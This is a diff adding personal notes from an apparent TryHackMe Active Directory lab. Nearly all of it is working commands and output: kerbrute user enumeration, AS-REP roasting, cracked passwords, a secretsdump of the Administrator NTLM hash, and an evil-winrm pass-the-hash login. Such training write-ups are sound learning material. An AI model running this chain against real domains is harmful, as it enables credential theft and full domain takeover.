@@ -1,0 +1,67 @@
+------------------
+NOTES
+------------------
+Initial enumeration, amazingly executed by goHeartBleed, found open ports
+
+sadly nmap is a far better tool:
+nmap -sV -sC -oN fullNmap -T4 10.10.15.225
+		Not shown: 987 closed tcp ports (conn-refused)
+		PORT     STATE SERVICE       VERSION
+		135/tcp  open  msrpc         Microsoft Windows RPC
+		139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+		3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+		3389/tcp open  ms-wbt-server Microsoft Terminal Services
+		| rdp-ntlm-info:
+		|   Target_Name: THM-AD
+		|   NetBIOS_Domain_Name: THM-AD
+		|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+		|   DNS_Domain_Name: spookysec.local
+		|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+		|   Product_Version: 10.0.17763
+		|_  System_Time: 2021-12-11T21:37:45+00:00
+		| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+		| Not valid before: 2021-12-10T21:25:42
+		|_Not valid after:  2022-06-11T21:25:42
+		|_ssl-date: 2021-12-11T21:37:53+00:00; 0s from scanner time.
+		Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Can see the domain name and the .local TLD
+
+using my new knowledge of enumerating the domain, can use kerbrute to find cool users
+	kerbrute userenum --dc spookysec.local -d spookysec.local /usr/share/wordlists/AD_THM/userlist.txt
+interesting users
+	svc-admin
+	administrator
+	backup
+
+have usernames now trying to do ASREP roasting
+	fuck me im gonna have to use impacket
+	occurs when a user has the privilege "Does not require Pre-Authentication"
+	Very nice sample command
+		root@kali:/impacket/examples/> python GetNPUsers.py testAD.local/ -usersfile users.txt -format hashcat -outputfile hashes.testAD
+			I need to use python2, idk why
+
+password for svc-admin cracked
+	svc-admin:management2005
+
+Remeber to look at the type of the hash to find out which mode to use!!
+
+now we have user creds and are spraying the AD
+	smbclient -L spookysec.local -U svc-admin
+Notes on smbclient
+	need to give a full address to interact
+		smbclient '\\spookysec.local\backup' -U svc-admin
+	used to connect to shares
+	when connected use mget to download a file
+
+In the backup creds file, b64 decode to get:
+	backup@spookysec.local:backup2517860
+
+python2 secretsdump.py spookysec.local/backup:backup2517860@spookysec.local
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+
+With the hash of the admin, can conncet using the hash (no password needed)
+
+evil-winrm -i MACHINE_IP -u Administrator -H THEFOUNDHASH
+
+	evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
